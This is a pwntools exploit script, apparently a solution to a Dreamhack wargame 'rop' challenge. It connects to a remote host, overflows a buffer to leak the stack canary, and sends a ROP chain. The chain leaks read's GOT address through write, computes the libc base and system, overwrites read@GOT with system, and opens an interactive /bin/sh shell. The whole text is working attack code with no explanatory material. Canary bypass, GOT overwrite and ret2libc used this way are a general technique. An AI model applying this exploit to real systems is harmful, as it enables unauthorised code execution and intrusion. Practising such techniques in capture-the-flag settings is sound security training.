from pwn import *
def slog(name, addr): return success(' : '.join([name,hex(addr)]))
p=remote("host3.dreamhack.games",23919)
e=ELF('./rop')
libc=ELF('./libc.so.6')

payload=b'A'*0x39
p.sendafter('Buf: ', payload)
p.recvuntil(payload)
canary=u64(b"\x00"+p.recv(7))
slog('canary',canary)

read_plt=e.plt['read']
read_got=e.got['read']
write_plt=e.plt['write']
pop_rdi=0x0000000000400853
pop_rsi_r15=0x0000000000400851
ret=0x0000000000400596

payload=b'A'*0x38+p64(canary)+b'B'*0x8

payload+=p64(pop_rdi)+p64(1)
payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)
payload+=p64(write_plt) #write(1, read_got)

payload+=p64(pop_rdi)+p64(0)
payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)
payload+=p64(read_plt) #read(0,read_got)

payload+=p64(pop_rdi)
payload+=p64(read_got+0x8)
payload+=p64(ret)
payload+=p64(read_plt) #read("/bin/sh") = system("/bin/sh)

p.sendafter(b'Buf: ', payload)
read = u64(p.recvn(6)+b'\x00'*2)
lb= read - libc.symbols['read']
system=lb+ libc.symbols['system']
slog('read', read)
slog('libc_base', lb)
slog('system', system)

p.send(p64(system)+b'/bin/sh\x00')

p.interactive()

